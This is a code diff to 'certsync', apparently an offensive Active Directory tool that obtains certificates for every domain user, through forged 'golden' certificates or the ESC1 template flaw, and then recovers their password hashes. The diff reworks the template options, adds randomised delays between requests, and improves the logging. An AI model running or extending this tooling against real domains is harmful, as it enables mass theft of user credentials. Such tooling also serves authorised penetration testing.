@@ -74,9 +74,6 @@ class MinifiedRequest(Request):
     def request(self) -> bool:
         username = self.target.username
 
-        renewal_cert = None
-        renewal_key = None
-
         csr, key = create_csr(
             username,
             alt_upn=self.alt_upn,
@@ -217,7 +214,8 @@ class CertSync:
         self.ca_cert = None
         self.ca_p12 = None
         self.file = None
-        self.template = options.template if options.template is not None else "SubCA" 
+        self.template = options.template
+        self.template_name = options.template_name if options.template_name is not None else "SubCA"
         self.template_pfx = None
         self.template_key = None
         self.template_cert = None
@@ -239,6 +237,7 @@ class CertSync:
                 with open(options.template, "rb") as f:
                     self.template_pfx = f.read()
                     self.template_key, self.template_cert = load_pfx(self.template_pfx)
+
         if options.k:
             principal = get_kerberos_principal()
             if principal:
@@ -335,14 +334,15 @@ class CertSync:
                         pass
         else:
             # Request for every user
-            if self.template is None: self.template = "SubCA"
-            request = MinifiedRequest(target = ca_target, ca = self.ca_name, template = self.template, upn=None)
+            logging.info(f"Getting users certificate using '{self.template_name}' template")
+
+            request = MinifiedRequest(target = ca_target, ca = self.ca_name, template = self.template_name, upn=None)
             for user in (tqdm(users.values()) if self.options.debug else users.values()):
                 sleep(self.timeout + random.randint(0,self.jitter))
                 request.set_upn(user.samaccountname)
                 req = request.request()
                 if not req:
-                    logging.error("Failed to retrieve certificate")
+                    logging.error(f"Failed to retrieve certificate for user {user.samaccountname}")
                 else:
                     user.set_cert(request.cert, request.key)
 
@@ -555,7 +555,7 @@ class CertSync:
 def main() -> None:
     logger.init()
     version = importlib.metadata.version("certsync")
-    parser = argparse.ArgumentParser(description=f"Dump NTDS with golden certificates and UnPAC the hash.\nVersion: {version}", add_help=True)
+    parser = argparse.ArgumentParser(description=f"Retrieve domain users hash by getting certificates and UnPAC the hash.\nVersion: {version}", add_help=True)
     parser.add_argument('action', action="store", help="Action you want to perform : golden, esc1")
     parser.add_argument("-debug", action="store_true", help="Turn DEBUG output ON")
     parser.add_argument(
@@ -580,9 +580,18 @@ def main() -> None:
         action="store",
         metavar="ip address",
         help=(
-            "IP Address of the certificate authority. If omitted it will use the domain"
+            "IP Address of the certificate authority. If omitted it will use the domain "
             "part (FQDN) specified in LDAP"
         ),
+    )
+
+    ca_group.add_argument(
+        "-template-name",
+        action="store",
+        metavar="SubCA",
+        dest="template_name",
+        help="(ESC1 only) Template to use for requests",
+        required=False,
     )
 
     authentication_group = parser.add_argument_group("authentication options")
@@ -679,7 +688,7 @@ def main() -> None:
         action="store",
         metavar="cert.pfx",
         dest="template",
-        help="golden : base template to use in order to forge certificates / esc1 : template to use for requests (Default = SubCA)",
+        help="(Golden Only) Base template to use in order to forge certificates",
         required=False,
     )
 
